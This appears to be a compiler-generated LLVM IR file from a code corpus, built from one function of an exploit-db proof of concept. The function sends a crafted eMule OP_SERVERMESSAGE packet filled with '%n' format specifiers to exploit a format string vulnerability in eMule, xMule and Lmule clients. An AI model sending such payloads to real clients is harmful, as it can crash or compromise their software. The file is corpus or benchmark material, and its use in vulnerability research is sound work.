; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_90.c_send_server_message.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_90.c_send_server_message.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.send_server_message.buf = private unnamed_addr constant [374 x i8] c"\E3p\01\00\008m\01%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\0AWelcome to messmule, a proof-of-concept for:\0AeMule/xMule/Lmule OP_SERVERMESSAGE\0AFormat String Vulnerability\0A%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\0AIf you can read this message from your Server info box,\0Ayour client is probably not affected by that vulnerability.\0A%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\0A\00", align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @send_server_message(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca [374 x i8], align 16
  store i32 %0, i32* %2, align 4
  %4 = bitcast [374 x i8]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %4, i8* align 16 getelementptr inbounds ([374 x i8], [374 x i8]* @__const.send_server_message.buf, i32 0, i32 0), i64 374, i1 false)
  %5 = load i32, i32* %2, align 4
  %6 = getelementptr inbounds [374 x i8], [374 x i8]* %3, i64 0, i64 0
  %7 = call i32 @send(i32 %5, i8* %6, i32 373, i32 0)
  %8 = sext i32 %7 to i64
  %9 = icmp ne i64 %8, 373
  %10 = zext i1 %9 to i32
  ret i32 %10
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
